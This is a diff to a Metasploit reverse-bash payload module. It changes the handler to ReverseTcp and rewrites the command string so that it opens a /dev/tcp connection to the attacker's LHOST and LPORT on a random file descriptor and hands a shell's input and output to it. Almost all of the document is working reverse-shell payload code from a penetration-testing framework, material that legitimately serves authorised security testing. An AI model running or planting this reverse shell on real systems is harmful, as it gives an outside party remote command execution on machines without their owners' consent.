@@ -1,5 +1,5 @@
 require 'msf/core'
-require 'msf/core/handler/reverse_tcp_double'
+require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 
 module Msf
@@ -21,7 +21,7 @@ module ReverseBash
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'unix',
 			'Arch'          => ARCH_CMD,
-			'Handler'       => Msf::Handler::ReverseTcpDouble,
+			'Handler'       => Msf::Handler::ReverseTcp,
 			'Session'       => Msf::Sessions::CommandShell,
 			'PayloadType'   => 'cmd_bash',
 			'Payload'       =>
@@ -43,7 +43,8 @@ module ReverseBash
 	# Returns the command string to use for execution
 	#
 	def command_string
-		return "exec 13<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']};sh <&13 >&13";
+		fd = rand(200) + 20
+		return "0<&#{fd}-;exec #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']};sh <&#{fd} >&#{fd} 2>&#{fd}";
 	end
 
 end
